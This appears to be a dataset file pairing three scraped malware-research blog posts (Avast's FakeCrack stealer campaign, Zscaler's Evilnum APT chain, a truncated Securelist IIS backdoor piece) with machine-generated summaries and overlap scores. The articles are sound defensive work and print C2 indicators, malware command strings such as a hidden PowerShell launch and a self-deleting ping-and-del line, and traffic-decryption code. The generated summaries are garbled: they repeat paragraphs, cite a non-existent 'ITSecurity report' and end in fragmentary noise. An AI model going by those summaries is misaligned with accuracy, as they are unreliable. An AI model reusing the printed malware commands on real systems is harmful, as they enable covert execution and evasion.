https://blog.avast.com/fakecrack-campaign;Crypto stealing campaign spread via fake cracked software;"Users who download cracked software risk sensitive personal data being stolen by hackers.Are you interested in downloading free, cracked software? If so, you should know what you're getting into.When you accidentally download malicious cracked software, attackers can take everything you have on your PC, and you'll end up without your sensitive personal data and even without the software that you were trying to download in the first place. This is precisely how the newly emerged FakeCrack campaign is doing its business, enticing users into downloading fake cracked software. The bad actors behind the campaign have utilized a vast infrastructure to deliver malware and steal personal and other sensitive data, including crypto assets. Interested in knowing more? Let's dive a bit deeper.Delivery infrastructureThe infection chain starts on dubious sites that supposedly offer cracked versions of well-known and used software, such as games, office programs, or programs for downloading multimedia content. All these sites are placed in the highest positions in search engine results. The vast majority of the results on the first page lead to compromised crack sites, and users end up downloading malware instead of the crack. This technique is known as the Black SEO mechanism exploiting search engine indexing techniques.Next, a link leads to an extensive infrastructure that delivers malware. What's interesting about this infrastructure is its scale. After clicking on the link, the user is redirected through a network of domains to the landing page. These domains have a similar pattern and are registered on Cloudflare using a few name servers. The first type of domain uses the pattern freefilesXX.xyz, where XX are digits. This domain usually only serves as a redirector. The redirect leads to another page using the cfd top-level domain. These cfd domains serve as a redirector as well as a landing page. Overall, Avast has protected roughly 10,000 users from being infected daily who are located primarily in Brazil, India, Indonesia, and France.Figure 1: Protected users on the whole delivery infrastructure (1 day period)The landing page has different visual forms. All of them offer a link to a legitimate file share platform, which contains a malware ZIP file. The file sharing services abused in this campaign include, for example, the Japanese file sharing filesend.jp or mediafire.com. An example of the landing page is shown below.Figure 2: Landing pageDelivered malwareAfter accessing the provided link, the ZIP file is downloaded. This ZIP is encrypted with a simple password (usually 1234) which prevents the file from being analyzed by antivirus software. This ZIP usually contains a single executable file, typically named setup.exe or cracksetup.exe. We collected eight different executables that were distributed by this campaign.These eight samples exhibit stealers' activities, focusing on scanning the user's PC and collecting private information from the browsers, such as passwords or credit card data. Data from electronic wallets are also being collected. The data has been exfiltrated in encrypted ZIP format to C2 servers. However, the ZIP file encryption key is hardcoded into the binary, so getting the content is not difficult. The encrypted ZIP contains all information mentioned previously, like the information about the system, installed software, screenshot and data collected from the browser including passwords or private data of crypto extensions.Figure 3: Exfiltered data in ZIPFigure 4: Zip password hardcoded in the binaryPersistence techniquesThe delivered stealer malware using two persistence techniques. Both of these techniques were exclusively targeted at stealing crypto-related information, which we'll now describe in more detail.Clipboard changer techniqueIn addition to stealing sensitive personal information as described above, some of the samples also preserved persistence by dropping two additional files. The AutoIt compiler for the case is not present on the user's computer and the AutoIt script. The script has been usually dropped to the AppData\Roaming\ServiceGet\ folder and scheduled to run automatically at a predefined time.This script is quite large and very heavily obfuscated, but after a closer examination, it does only a few elementary operations. For one, it periodically checks the content of the clipboard. When it detects the presence of the crypto wallet address in the clipboard, it changes the value of the clipboard to the wallet address under the attacker's control. The protection mechanism also deletes the script after three successful changes of the wallet address in the clipboard. The figure below shows the deobfuscated version of the part of the script.The periodic_clipboard_checks function is being called in an infinite loop. Each call of the check_clipboard function checks the presence of the wallet address in the clipboard and changes its content to the attacker's controlled address. The attacker is prepared for various crypto wallets, ranging from Terra, Nano, Ronin, or Bitcoincash. The numeric parameters in the check_clipboard function are not important and serve only for optimizations.Figure 5: Dropped AutoIt scriptIn total, we identified 37 different wallets for various cryptocurrencies. Some of them were already empty, and some of them we could not identify. However, we checked these wallets on the blockchain and we estimate that the attacker earned at least $50,000. Moreover, if we omit the massive drop in the price of the Luna crypto in recent days, it was almost $60,000 in approximately a one month period.Proxy stealing techniqueThe second interesting technique that we observed in connection with this campaign was the use of proxies to steal credentials and other sensitive data from some crypto marketplaces. Attackers were able to set up an IP address to download a malicious Proxy Auto-Configuration script (PAC). By setting this IP address in the system, every time the victim accesses any of the listed domains, the traffic is redirected to a proxy server under the attacker's control.This type of attack is quite unusual in the context of the crypto stealing activity, however, it is very easy to hide it from the user, and the attacker can observe the victim's traffic at given domains for quite a long time without being noticed. The figure below shows the content of the Proxy Autoconfiguration Script set up by an attacker. Traffic to Binance, Huobi, and OKX cryptomarkets is being redirected to the attacker's controlled IP address.Figure 6: Proxy autoconfig scriptHow to remove the proxy settingsThis campaign is dangerous mainly due to its extension. As it was shown at the beginning, the attacker managed to get the compromised sites to high positions in search results. The number of protected users also shows that this campaign is quite widespread. If you suspect your computer has been compromised, check the proxy settings and remove malicious settings using the following procedure.The proxy settings must be removed manually by using the following guidelines:Remove AutoConfigURL registry key in the HKCU\Software\Microsoft\Windows\CurrentVersion\Internet SettingsAlternatively, using GUI:Click on the Start Menu.Type Settings and hit enter.Go to Network & Internet -> Proxy.Delete Script Address and click on the Save button.Disable the ""Use a proxy server"" option.For this campaign, cybercriminals abuse the brand names of popular software, by promoting illegal, seemingly cracked versions of them to lure users into downloading the malware. Brand names abused for this campaign are for example ""CCleaner Pro Windows"", but also ""Microsoft Office"", ""Movavi Video Editor 22.2.1 Crack"" ""IDM Download Free Full Version With Serial Key"" ""Movavi Video Editor 22.2.1 Crack"" ""Crack Office 2016 Full Crack + Product Key (Activator) 2022"". We recommend users to always stick to official software versions instead of cracked versions.Thanks to Martin Hanzlik, a high school student intern who participated in tracking this campaign and significantly contributed to this blog post.IoCDelivery infrastructuregoes12by[.]cfd baed92all[.]cfd aeddkiu6745q[.]cfd 14redirect[.]cfd lixn62ft[.]cfd kohuy31ng[.]cfd wae23iku[.]cfd yhf78aq[.]cfd xzctn14il[.]cfd mihatrt34er[.]cfd oliy67sd[.]cfd er67ilky[.]cfd bny734uy[.]cfd uzas871iu[.]cfd dert1mku[.]cfd fr56cvfi[.]cfd asud28cv[.]cfd freefiles34[.]xyz freefiles33[.]xyz wrtgh56mh[.]cfdMalwareSHA-256 bcb1c06505c8df8cf508e834be72a8b6adf67668fcf7076cd058b37cf7fc8aaf c283a387af09f56ba55d92a796edcfa60678e853b384f755313bc6f5086be4ee ac47ed991025f58745a3ca217b2091e0a54cf2a99ddb0c98988ec7e5de8eac6a 5423be642e040cfa202fc326027d878003128bff5dfdf4da6c23db00b5942055 c283a387af09f56ba55d92a796edcfa60678e853b384f755313bc6f5086be4ee 9254436f13cac035d797211f59754951b07297cf1f32121656b775124547dbe7 5423be642e040cfa202fc326027d878003128bff5dfdf4da6c23db00b5942055 9d66a6a6823aea1b923f0c200dfecb1ae70839d955e11a3f85184b8e0b16c6f8Stealer C2 and exfiltration serversIP Address 185[.]250.148.76 45[.]135.134.211 194[.]180.174.180 45[.]140.146.169 37[.]221.67.219 94[.]140.114.231Clipboard changer scriptSHA-256 97f1ae6502d0671f5ec9e28e41cba9e9beeffcc381aae299f45ec3fcc77cdd56Malicious proxy serverIP 104[.]155.207.188";"Users who download cracked software risk sensitive personal data being stolen by hackers. Are you interested in downloading free, cracked software? If so, you should know what you're getting into. When you accidentally download malicious cracked software, attackers can take everything you have on your PC, and you'll end up without your sensitive personal data and even without the software that you were trying to download in the first place. This is precisely how the newly emerged FakeCrack campaign is doing its business, enticing users into downloading fake cracked software. The bad actors behind the campaign have utilized a vast infrastructure to deliver malware and steal personal and other sensitive data, including crypto assets. Interested in knowing more? Let's dive a bit deeper. Delivery infrastructure The infection chain starts on dubious sites that supposedly offer cracked versions of wellknown and used software, such as games, office programs, or programs for downloading multimedia content. All these sites are placed in the highest positions in search engine results. The vast majority of the results on the first page lead to compromised crack sites, and users end up downloading malware instead of the crack. This technique is known as the Black SEO mechanism exploiting search engine indexing techniques. Next, a link leads to an extensive infrastructure that delivers malware. What's interesting about this infrastructure is its scale. After clicking on the link, the user is redirected through a network of domains to the landing page. These domains have a similar pattern and are registered on Cloudflare using a few name servers. The first type of domain uses the pattern freefilesXX.xyz, where XX are digits. This domain usually only serves as a redirector. The redirect leads to another page using the cfd toplevel domain. These cfd domains serve as a redirector as well as a landing page. Overall, Avast has This campaign is dangerous mainly due to its extension. As it was shown at the beginning, the attacker managed to get the compromised sites to high positions in search results. The number of protected users also shows that this campaign is quite widespread. If you suspect your computer has been compromised, check the proxy settings and remove malicious settings using the following procedure.The proxy settings must be removed manually by using the following guidelines:Remove AutoConfigURL registry key in the HKCU\Software\Microsoft\Windows\CurrentVersion\Internet SettingsAlternatively, using GUI:Click on the Start Menu.Type Settings and hit enter.Go to Network & Internet > Proxy.Delete Script Address and click on the Save button.Disable the ""Use a proxy server"" option.For this campaign, cybercriminals abuse the brand names of popular software, by promoting illegal, seemingly cracked versions of them to lure users into downloading the malware. Brand names abused for this campaign are for example ""CCleaner Pro Windows"", but also ""Microsoft Office"", ""Movavi Video Editor 22.2.1 Crack"" ""IDM Download Free Full Version With Serial Key"" ""Movavi Video Editor 22.2.1 Crack"" ""Crack Office 2016 Full Crack + Product Key (Activator) 2022"". We recommend users to always stick to official software versions instead of cracked versions.Thanks to Martin Hanzlik, a high school student intern who participated in tracking this campaign and significantly contributed to this blog post.IoCDelivery infrastructuregoes12by[. ]cfd baed92all[. ]cfd aeddkiu6745q[. ]cfd 14redirect[. ]cfd lixn62ft[. The ITSecurity report has identified two types of malicious activity: malware and malicious proxy servers. Malware is a type of malicious software that can be used to steal sensitive data, such as credit card numbers, passwords, and other personal information. Malicious proxy servers are malicious servers that can be used to intercept and modify data that is being transmitted over the internet. These malicious proxy servers can also be used to redirect users to malicious websites. The ITSecurity report has identified two types of malicious activity: malware and malicious proxy servers. Malware is a type of malicious software that can be used to steal sensitive data, such as credit card numbers, passwords, and other personal information. Malicious proxy servers are malicious servers that can be used to intercept and modify data that is being transmitted over the internet. These malicious proxy servers can also be used to redirect users to malicious websites. The ITSecurity report has identified two types of malicious activity: malware and malicious proxy servers. Malware is a type of malicious software that can be used to steal sensitive data, such as credit card numbers, passwords, and other personal information. Malicious proxy servers are malicious servers that can be used to intercept and modify data that is being transmitted over the internet. These malicious proxy servers can also be used to redirect users to malicious websites. The ITSecurity report has identified two types of malicious activity: malware and malicious proxy servers. Malware is a type of malicious software that can be used to steal sensitive data, such as credit card numbers, passwords, and other personal information. Malicious proxy servers are malicious servers that can be used to intercept and modify data that is being transmitted over the internet. These malicious proxy servers can also be used to redirect users to malicious websites. The ITSecurity";en;{'r': 0.48632218844984804, 'p': 0.9495548961424333, 'f': 0.643216075922406};{'r': 0.41457286432160806, 'p': 0.8807829181494662, 'f': 0.5637813168321824};{'r': 0.48632218844984804, 'p': 0.9495548961424333, 'f': 0.643216075922406}
https://www.zscaler.com/blogs/security-research/return-evilnum-apt-updated-ttps-and-new-targets;Evilnum APT returns with updated TTPs and New Targets;"SummarySince the beginning of 2022, ThreatLabz has been closely monitoring the activities of the Evilnum APT group. We identified several instances of their low-volume targeted attack campaigns launched against our customers in the UK and Europe region.The new instances of the campaign use updated tactics, techniques, and procedures. In earlier campaigns observed in 2021, the main distribution vector used by this threat group was Windows Shortcut files (LNK) sent inside malicious archive files (ZIP) as email attachments in spear phishing emails to the victims.In the most recent instances, the threat actor has started using MS Office Word documents, leveraging document template injection to deliver the malicious payload to the victims' machines. In this blog, we present the technical details of all components involved in the end-to-end attack chain. At the time of writing, to the best of our knowledge, the complete attack chain of this new instance of Evilnum APT group is not publicly documented anywhere.ThreatLabz has identified several domains associated with Evilnum APT group which have not been previously detected by security vendors. This discovery indicates that the Evilnum APT group has been successful at flying under the radar and has remained undetected for a long time.Key pointsThe key targets of the Evilnum APT group have predominantly been in the FinTech (Financial services) sector, specifically companies dealing with trading and compliance in the UK and Europe.In March 2022, we observed a significant update in the choice of targets of Evilnum APT group. They targeted an Intergovernmental organizatio n which deals with international migration services .n which deals with . The timeline of the attack and the nature of the chosen target coincided with Russia-Ukraine conflict.Macro-based documents used in the template injection stage leveraged VBA code stomping technique to bypass static analysis and also to deter reverse engineering.A heavily obfuscated JavaScript was used to decrypt and drop the payloads on the endpoint. The JavaScript configured a scheduled task to run the dropped binary. This JavaScript has significant improvements in the obfuscation technique compared to the previous versions used by EvilNum APT group.The names of all the file system artifacts created during the course of execution were chosen carefully by the threat actor to spoof legitimate Windows and other legitimate third party binaries' names.In each new instance of the campaign, the APT group registered multiple domain names using specific keywords related to the industry vertical targeted.Attack flowFigure 1: Attack chainTechnical AnalysisFor the purpose of technical analysis we will consider the document with MD5: 0b4f0ead0482582f7a98362dbf18c219Stage 1: Malicious documentThe stage 1 malicious document is delivered via spear phishing email. Once the user downloads and opens the malicious document, it fetches the stage 2 macro template from the attacker-hosted domain and displays the decoy content as shown in Figure 2 asking the user to enable the macro content.Figure 2: Decoy contentStage 2: Macro template [VBA code stomping technique]The stage 2 template contains the main malicious macro code. It makes use of VBA code stomping technique which is fairly uncommon in the wild. This technique destroys the original source code and only a compiled version of the VBA macro code (also known as p-code) is stored in the document.As a result, this technique prevents static analysis tools such as olevba from extracting the decompiled VBA code.Using the technique mentioned by the Walmart team here , we were able to extract the full macro code.All the strings in the macro code are decrypted using the string decryption function shown in Figure 3.Figure 3: String decryption function used in the VBA macro codeBelow are the key functionalities of the macro.1. The document file has two text boxes with encrypted contents. These textboxes will be decrypted at run time by the VBA macro code.a) Textbox 1 - msform_ct.TextBox1.Text. This will be decrypted and contents will be written to %appdata%\""ThirdPartyNotices.txt""b) Textbox 2 - msform_ct.TextBox2.Text - This will be decrypted and contents will be written to ""%appdata%\Redist.txt""2. Copies the legitimate Windows binary Wscript.exe to a file with the name ""msdcat.exe"". Such file copy operations are done by malwares as a way to bypass endpoint security products.3. The file - Redist.txt contains the obfuscated JavaScript which will be executed with the following command line:msdcat.exe"" /E:jscRipt ""%appdata%\Redist.txt"" dg ThirdPartyNotices.txtNote: ""dg"" is a hard coded command line parameter present inside the VBA macro code.4. During the course of execution of VBA macro code, there are multiple calls to doc.Shapes.AddPicture() which fetches a JPG image from the attacker-controlled server. We believe this was done by the attacker to trace and log the execution of code on the endpoint.One such example is shown in Figure 4. There is a call to doc.Shapes.AddPicture() between the building of the command line and the execution of the command line.Figure 4: VBA code fetches image from attacker's server to log actions on endpointStage 3: Dropped JavaScript [Deobfuscation and analysis]The original JavaScript dropped by the VBA-based macro code is heavily obfuscated. We will highlight some of the unique obfuscation techniques used which are rarely observed in obfuscated JavaScripts.There are two parameters passed to this JavaScript at the time of execution with following command line:msdcat.exe"" /E:jscRipt ""C:\Users\user\AppData\Roaming\Redist.txt"" dg ThirdPartyNotices.txtparameter 1: ""dg"". This string is later used in the string decryption function in JavaScript.parameter 2: The file ""ThirdPartyNotices.txt"" contains the encrypted code which will be decrypted and dropped by the JavaScript on the filesystem with binary name - SerenadeDACplApp.exeMost obfuscation techniques involve a large array of encrypted and encoded strings which are referenced throughout the code using indexes. A common approach to deobfuscate this requires multiple ""search and replace"" operations where you replace the reference with the actual decrypted and decoded string.JavaScript in this case used an interesting technique where the original array of strings was shuffled, and would be unshuffled in memory at the time of execution. So, any attempt to dereference the strings without unshuffling the array would result in an error. Such a method can be used to deter reverse engineering and also bypass some tools which try to automate the process of deobfuscation.Let's look at it in more detail.Figure 5 below shows the huge array of strings defined at the beginning of the JavaScript. This array is wrapped inside a function as an extra layer of obfuscation.Figure 5: array of encoded and encrypted stringsThe next step is to unshuffle the array. Figure 6 below shows the relevant JavaScript code which uses a brute force approach to unshuffle the array. It has a predefined seed of value ""0x6467a"". Upon each iteration, the function computes a seed using various mathematical operations and compares it with the predefined seed ""0x6467a"". The function continues to shift the contents of the array by one position to the right until this condition is satisfied.Relevant comments are included in the code to illustrate the unshuffling logic.Figure 6: JavaScript function which unshuffles the arrayOther techniques used for obfuscation involve control flow flattening techniques which leverage switch-case obfuscation. Figure 7 shows one of the string decryption functions which uses such an obfuscation technique.Figure 7: Control flow flattening using switch-case obfuscationThe sequence of steps of decryption are shuffled using switch-case and the order is followed according to the following sequence:""15|12|3|2|14|5|1|10|9|17|8|7|6|4|13|16|0|11""It means, ""case 15"" is executed followed by ""case 12"" and so on. The final ""case 11"" returns the decrypted string.We can re-write the string decryption function as shown in Figure 8 which is easier to analyze.Figure 8: re-written string decryption functionWe have included a list of interesting decrypted strings extracted from the JavaScript in Appendix I.[+] PersistenceThe threat actor achieves persistence via Scheduled task. During JavaScript execution, a scheduled task with the name ""UpdateModel Task'' will be created to execute the dropped loader binary with required command line arguments.Task details:<Exec><Command>%appdata%\Microsoft\FontCache\CloudFonts\SerenadeDACplApp.exe</Command><Arguments>""OUM3NjBDNjAtRkNDQi00Q0FDLUE5NEMtNzY0RTc5MDNDN0Mw"" ""devZUQVD.tmp"" ""NzkzMTA3"" ""Ni4xLjc2MDE%3D"" 0 ""E4A6450B"" ""NTk1NDQxWwpaWhlhdmVbB1tf"" Z</Arguments><WorkingDirectory>%appdata%\Microsoft\FontCache\CloudFonts</WorkingDirectory></Exec>Stage 4: Dropped binary (Loader)As described in previous section, the JavaScript drops two files:a) An executable file (SerenadeDACplApp.exe) - It turns out to be a loaderb) A binary file (devZUQVD.tmp) - This is the file loaded during runtime by the loaderThe loader is executed by the scheduled task along with the required arguments. During the course of its execution it performs following operations:1. Performs command-line checks and extracts the file name for the binary to be loadedThe loader checks if the command-line ends with (""). If true then it will terminate the process else it will parse the arguments to extract the file name for the binary file to be loaded. There are two code logics to extract the file nameIf the first argument has the format (--[char]=[char]*) then the loader will remove the first 5 characters from this argument string, prepend ""dev"" and append "".tmp"" to it. The resulting string is used as the file name for the dropped binary.Example:Argument string: --E=nThisIsUsedInFileNameExtracted file name: devThisIsUsedInFileName.tmpThe second argument string is used as the file name for the dropped binary2. Generate full path for the dropped binary file in DOS formatThe loader first extracts the full path of the currently executing binary and prepends it with ""\\??\\"" and then overwrites the file name of the currently executing binary with the file name extracted in Step-1.3. Using the Heaven's gate technique calls the NtOpenFile API to create a file handle4. Allocates memory for reading the file content using RtlAllocateHeap API5. Using the Heaven's gate technique calls the NtReadFile API to read the file content to allocated memory6. Decrypt the file content Encrypted content formatXOR key length (1 byte) + XOR key + encrypted content size (4 bytes) + encrypted contentFigure 9: Encrypted content formatThe decrypted content turns out to be a PE file that uses a custom format for storing the PE header and section header information. Decrypted content formatCustom PE header (+ Custom Section header + Section data)*Number of sections PE header formatStart of decrypted content as well as PE header (1 byte - 00) + Image Base (4 bytes) + Size of Image (4 bytes) + Entry Point (4 bytes) + Number of sections (4 bytes) + Offset to first section information from start of decrypted content (4 bytes) + Size of decrypted content (4 bytes) Section header formatSection number marker (1 byte) + Section RVA (4 bytes) + Section VirtualSize (4 bytes) + Unknown (4 bytes)Figure 10: PE header, Section header and Section data7. Using the Heaven's gate technique calls the NtAllocateVirtualMemory API to allocate memory for the PE file to be mapped.Note: The size is taken from the PE header format described above.8. Map the PE file in memory.9. Using Heaven's gate technique calls the NtCreateThreadEx API to create a thread pointing to the entry point of mapped PE.Note: The loader uses Heaven's gate technique to evade endpoint security products as well as syscall or API monitoring applications. It uses a custom header format to thwart memory scanning for PE header or section header patterns and also makes it difficult to dump and analyze the PE file as a standalone executable.Stage 5: Mapped PE (Main backdoor)The mapped PE is the main backdoor of the attack chain. On execution it performs the following operations:1. Decrypts the backdoor configuration which includes :a) C2 domainsb) User Agent stringsc) Network pathsd) Referrer stringse) Cookies type stringsf) Request methods + Library names (These will be loaded during further execution) + Network communication key generation seed bytes + Mutex nameAll the information inside the configuration is encrypted using XOR key. The XOR key is different for each data item within the configuration. Encrypted data item formatEncrypted data size (2 bytes) + Encrypted data + XOR Key length (2 bytes) + XOR KeyFigure 11: Encrypted data item format2. Resolves API addresses for the libraries retrieved from the configuration3. Performs mutex check4. Builds data exfiltration string to be sent as part of the beacon request String format{""v"":""62"",""u"":""{first_arg-user_id}"",""a"":""{third_arg}"",""w"":""{fourth_arg}"",""d"":""{sixth_argument}"",""n"":""{seventh_arg}"",""r"":""0"",""xn"":""{name_of_executing_binary}"",""s"":0}5. Encrypt and Base64 encode the generated stringFigure 12: Steps performed for encrypting and encoding the exfiltrated dataNote: You can find the decryption code under Appendix III section6. Embed the encoded string inside the cookie header field by selecting one of the cookie type strings from the configuration.[+] Network communicationOnce all the above operations are done. The backdoor selects one of the C2 domains and a path string from the configuration and sends the beacon network request.If the beacon request is successful, the backdoor will query the server for available content and download it.Based on the content size two different operations are performed:1. If the content size is 4 then the backdoor checks if the downloaded data is equal to ""01"". If true, it takes the machine snapshot and sends it to the C2 server via POST request. The snapshot data is exfiltrated in encrypted form with the cookie header containing additional information. Format of cookie header string{""u"":""{first_arg-user_id}"", ""sc"":1, ""dt""=""{snapshot_date_time}""}2. If the content size is greater than 4, then the backdoor decrypts the downloaded data and executes it.Zscaler Sandbox report Template payloadIndicators of compromise[+] HashesMD5 Description Filename 0b4f0ead0482582f7a98362dbf18c219 Document proof of ownership.docx 4406d7271b00328218723b0a89fb953b Document tradersway compliance.docx 61776b209b01d62565e148585fda1954 Document vantagemarkets documents.docx 6d329140fb53a3078666e17c249ce112 Document vantagefx compliance.docx db0866289dfded1174941880af94296f Document calliber docs (2).docx f0d3cff26b419aff4acfede637f6d3a2 Document complaince tfglobaltrading.docx 79157a3117b8d64571f60fe62c19bf17 Document complaint europatradecapital.com.docx 63090a9d67ce9534126cfa70716d735f Document fxtm_compliance.docx f5f9ba063e3fee25e0a298c0e108e2d4 Document livetraderfx.docx ea71fcc615025214b2893610cfab19e9 Loader SerenadeDACplApp.exe 51425c9bbb9ff872db45b2c1c3ca0854 Encrypted binary devZUQVD.tmp[+] C2 Domainstravinfor[.]comwebinfors[.]comkhnga[.]comnetwebsoc[.]cominfcloudnet[.]combgamifieder[.]combunflun[.]comrefinance-ltd[.]combook-advp[.]commailservice-ns[.]comadvertbart[.]cominetp-service[.]comyomangaw[.]comcovdd[.]orgvisitaustriaislands[.]comtraveladvnow[.]comtripadvit[.]commoreofestonia[.]commoretraveladv[.]comestoniaforall[.]combookingitnow[.]orgtravelbooknow[.]orgbookaustriavisit[.]comwindnetap[.]comroblexmeet[.]comnetrcmapi[.]commeetomoves[.]combingapianalytics[.]comazuredcloud[.]comappdllsvc[.]comudporm[.]compcamanalytics[.]comnortonalytics[.]comdeltacldll[.]commscloudin[.]commsdllopt[.]com[+] Unique URI paths Below URI paths are appended to the domain names by the malware while sending POST requests/actions/async.php/admin/settings.php/admin/user/controller.php/admin/loginauth.php/administrator/index.php/cms/admin/login.php/backend/login/ajax_index.php/wp-admin/media-new.php/get.php/auth/login[+] Scheduled task namesUpdateModel TaskPropertyDefinitionSyncSchedule DefragAppendix I Unique strings extracted from the deobfuscated JavaScriptappdata%\Microsoft\FontCache\CloudFonts\FontsSchedule.ServiceSELECT UUID FROM Win32_ComputerSystemProductSELECT Version FROM Win32_OperatingSystem%USERDOMAIN%%USERNAME%MUIDUpdateModel Task/c start /min """" powershell -inputformat none -outputformat none -windowstyle hidden -c%localappdata%\DELL\DellMobileConnect\Dumps\TechToolkit.exe%localappdata%\DELL\DellMobileConnect\DumpsPropertyDefinitionSyncPT5H%appdata%\Mael Horz\HxD Hex Editor\Logsvapiu.exe%appdata%\Mael Horz\HxD Hex Editor\LogsSchedule DefragPT5HMetadataRefreshTaskWsSwap AssessmentTaskU64Pan.execmd /c """"ping 1.1.1.1 -n 5 -w 10000 > nul & del /qavastavgAntiVirusProductSerenadeDACplApp.exeWestern Digital\WD Backup\StoragecalcySupportAssistAppWire.exeE4A6450BwctXSPKB.tmpmsdcatAppendix II Runtime strings present inside the unpacked backdoor binary/admin/settings.php/admin/index.php/actions/authenticate.php/index.php/actions/async.php/wp-admin/media-new.php/backend/login/ajax_index.php/administrator/index.php/admin/login.php/admin/loginauth.php/wp-admin/admin-ajax.php/admin/user/controller.php/get.php/cms/admin/login.phpAPISIDSAPISIDSIDCCMSFPC__cfruid_vwo_uuid_v2campaignsourceReferer: http://www.bing.comReferer: http://www.google.comReferer: http://www.yahoo.comReferer: http://www.facebook.comReferer: http://github.comReferer: http://www.instagram.comReferer: http://mail.google.comConnection: keep-AliveContent-Type: text/plainAccept-Language: en-US,en,q=0.8Accept: */*Cookie:Global\wU3aqu1t2y8uNntdll.dllkernel32.dllcombase.dllole32.dllOleAut32.dllwininet.dllShell32.dllShcore.dllUser32.dllGdi32.dllAppendix III Decryption code for network communicationinclude <Windows.h>include <stdio.h>define SEED_SIZE 32VOID DeriveKey(BYTE seed[], BYTE key[]) {BYTE swapByte = 0,BYTE seedIndex = 0,BYTE calKeyIndex = 0,/* Initialize the key array */for (int i = 0, i < 256, i++) {key[i] = i,}/* Calculate XOR key */for (int currKeyIndex = 0, currKeyIndex < 256, currKeyIndex++) {calKeyIndex = seed[currKeyIndex % SEED_SIZE] + key[currKeyIndex] + calKeyIndex,swapByte = key[currKeyIndex],key[currKeyIndex] = key[calKeyIndex],key[calKeyIndex] = swapByte,}/* Print the derived XOR key */for (int k = 0, k < 256, k++) {printf(""%02x "", key[k]),}}VOID Decrypt(BYTE data[], BYTE key[]) {BYTE XORKeySize = data[0],BYTE *XORKey = (BYTE*)data + sizeof(BYTE),UINT encryptedDataSize = data[sizeof(BYTE) + XORKeySize],BYTE *encryptedData = (BYTE*)data + (sizeof(BYTE) + XORKeySize + sizeof(UINT)),BYTE *layer1DecryptedData = (BYTE*)malloc(encryptedDataSize),for (UINT dataIndex = 0, dataIndex < encryptedDataSize, dataIndex++) {layer1DecryptedData[dataIndex] = encryptedData[dataIndex] ^ XORKey[dataIndex % XORKeySize],}BYTE swapByte = 0,BYTE calKeyIndex = 0,BYTE finalKeyIndex = 0,for (UINT index = 1, index <= encryptedDataSize, index++) {calKeyIndex = key[index] + calKeyIndex,swapByte = key[index],key[index] = key[calKeyIndex],key[calKeyIndex] = swapByte,finalKeyIndex = key[index] + key[calKeyIndex],printf(""%c "", layer1DecryptedData[index - 1] ^ key[finalKeyIndex]),}}int main() {BYTE key[256],BYTE seed[SEED_SIZE] = { // Taken from configuration0xBD, 0xDE, 0x96, 0xD2, 0x9C, 0x68, 0xEE, 0x06, 0x49,0x64, 0xD1, 0xE5, 0x8A, 0x86, 0x05, 0x12, 0xB0, 0x9A,0x50, 0x00, 0x4E, 0xF2, 0xE4, 0x92, 0x5C, 0x76, 0xAB,0xFC, 0x90, 0x23, 0xDF, 0xC6},BYTE data[] = {// Put Base64 decoded encrypted data here in HEX format},DeriveKey(seed, key),printf(""""),Decrypt(data, key),return 0,}";"ThreatLabz has identified several domains associated with Evilnum APT group which have not been previously detected by security vendors. This discovery indicates that the Evilnum APT group has been successful at flying under the radar and has remained undetected for a long time. Stage 3: Dropped JavaScript [Deobfuscation and analysis] The original JavaScript dropped by the VBAbased macro code is heavily obfuscated. We will highlight some of the unique obfuscation techniques used which are rarely observed in obfuscated JavaScripts. There are two parameters passed to this JavaScript at the time of execution with following command line: msdcat.exe"" /E:jscRipt ""C:\Users\user\AppData\Roaming\Redist.txt"" dg ThirdPartyNotices.txt parameter 1: ""dg"". This string is later used in the string decryption function in JavaScript. parameter 2: The file ""ThirdPartyNotices.txt"" contains the encrypted code which will be decrypted and dropped by the JavaScript on the filesystem with binary name SerenadeDACplApp.exe Most obfuscation techniques involve a large array of encrypted and encoded strings which are referenced throughout the code using indexes. A common approach to deobfuscate this requires multiple ""search and replace"" operations where you replace the reference with the actual decrypted and decoded string. JavaScript in this case used an interesting technique where the original array of strings was shuffled, and would be unshuffled in memory at the time of execution. So, any attempt to dereference the strings without unshuffling the array would result in an error. Such a method can be used to deter reverse engineering and also bypass some tools which try to automate the process of deobfuscation. Let's look at it in more detail. Figure 5 below shows the huge array of strings defined at the beginning of the JavaScript. This array is wrapped inside a function as an extra layer of obfuscation. Figure 6 below shows The threat actor achieves persistence via Scheduled task. During JavaScript execution, a scheduled task with the name ""UpdateModel Task'' will be created to execute the dropped loader binary with required command line arguments.Task details:<Exec><Command>%appdata%\Microsoft\FontCache\CloudFonts\SerenadeDACplApp.exe</Command><Arguments>""OUM3NjBDNjAtRkNDQi00Q0FDLUE5NEMtNzY0RTc5MDNDN0Mw"" ""devZUQVD.tmp"" ""NzkzMTA3"" ""Ni4xLjc2MDE%3D"" 0 ""E4A6450B"" ""NTk1NDQxWwpaWhlhdmVbB1tf"" Z</Arguments><WorkingDirectory>%appdata%\Microsoft\FontCache\CloudFonts</WorkingDirectory></Exec> The ITSecurity report states that the attacker used a custom header format to evade endpoint security products as well as syscall or API monitoring applications. It used a custom header format to thwart memory scanning for PE header or section header patterns and also made it difficult to dump and analyze the PE file as a standalone executable. . The, the code. The. . ##. . . [12. [1000. [ [ [ of the 1. of the 1 of 1 of the. . . . . .";en;{'r': 0.20215633423180593, 'p': 0.9375, 'f': 0.33259423211488637};{'r': 0.15912272515165657, 'p': 0.8811369509043928, 'f': 0.2695652147999782};{'r': 0.20215633423180593, 'p': 0.9375, 'f': 0.33259423211488637}
https://securelist.com/the-sessionmanager-iis-backdoor/106868/;The SessionManager IIS backdoor: a possibly overlooked GELSEMIUM artefact;"Following on from our earlier Owowa discovery, we continued to hunt for more backdoors potentially set up as malicious modules within IIS, a popular web server edited by Microsoft. And we didn't come back empty-handed...In 2021, we noticed a trend among several threat actors for deploying a backdoor within IIS after exploiting one of the ProxyLogon-type vulnerabilities within Microsoft Exchange servers. Dropping an IIS module as a backdoor enables threat actors to maintain persistent, update-resistant and relatively stealthy access to the IT infrastructure of a targeted organization, be it to collect emails, update further malicious access, or clandestinely manage compromised servers that can be leveraged as malicious infrastructure.In early 2022, we investigated one such IIS backdoor: SessionManager. In late April 2022, most of the samples we identified were still not flagged as malicious in a popular online file scanning service, and SessionManager was still deployed in over 20 organizations.SessionManager has been used against NGOs, government, military and industrial organizations in Africa, South America, Asia, Europe, Russia and the Middle East, starting from at least March 2021. Because of the similar victims, and use of a common OwlProxy variant, we believe the malicious IIS module may have been leveraged by the GELSEMIUM threat actor, as part of espionage operations.SessionManager: there's yet another unwanted module in your web serverDeveloped in C++, SessionManager is a malicious native-code IIS module whose aim is to be loaded by some IIS applications, to process legitimate HTTP requests that are continuously sent to the server.Such malicious modules 